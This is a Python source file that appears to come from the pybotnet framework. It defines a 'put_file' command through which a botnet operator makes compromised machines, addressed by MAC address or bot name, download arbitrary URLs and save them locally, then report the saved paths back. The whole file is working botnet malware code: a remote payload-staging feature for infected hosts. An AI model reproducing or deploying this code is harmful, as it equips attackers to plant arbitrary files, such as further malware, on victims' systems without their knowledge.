from .. import BotNet, Context, UserException
import requests
import re
import os


@BotNet.default_script(script_version="0.0.1")
def put_file(context: Context) -> str:
    """
    put file to target system

    Syntax:
        `/put_file URL_1 URl2 ...`
        or
        `[mac-address] /put_file URL_1 URl2 ...`
        or
        `[BOT-NAME] /put_file URL_1 URl2 ...`

    Example command:
        `/put_file https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` \n
    """
    if len(context.command) > 0:
        failed_urls = {}
        success_urls = {}

        for i, file_url in enumerate(context.command):
            index_file_url = (i + 1, file_url)

            try:
                down_link = file_url
                file_name = re.findall(r".*/(.*)$", down_link)
                file_name = file_name[0]

                res = download_manager(down_link, file_name)
                
                if res == True:
                    path = os.path.join(os.getcwd(), file_name)
                    success_urls.update({index_file_url: path})

                else:
                    failed_urls.update({index_file_url: res})

            except Exception as e:
                failed_urls.update({index_file_url: e})

        status_str = ""
        if len(success_urls) > 0:
            status_str += "Successful Downloads:\n\n"
            for key, value in success_urls.items():
                status_str += f"URL{key[0]}:\n{key[1]}\nsaved to:\n{value}\n\n"

        if len(failed_urls) > 0:
            status_str += "\nFailed Downloads:\n\n"
            for key, value in failed_urls.items():
                status_str += f"URL{key[0]}:\n{key[1]}\nError:\n{value}\n\n"

        return status_str

    else:
        raise UserException("<There is no url to download>")


def download_manager(down_link: str, file_name: str) -> bool:
    """Download Manager"""
    try:
        req = requests.get(down_link)

        with open(file_name, "wb") as f:
            f.write(req.content)
        return True

    except Exception as e:
        return e
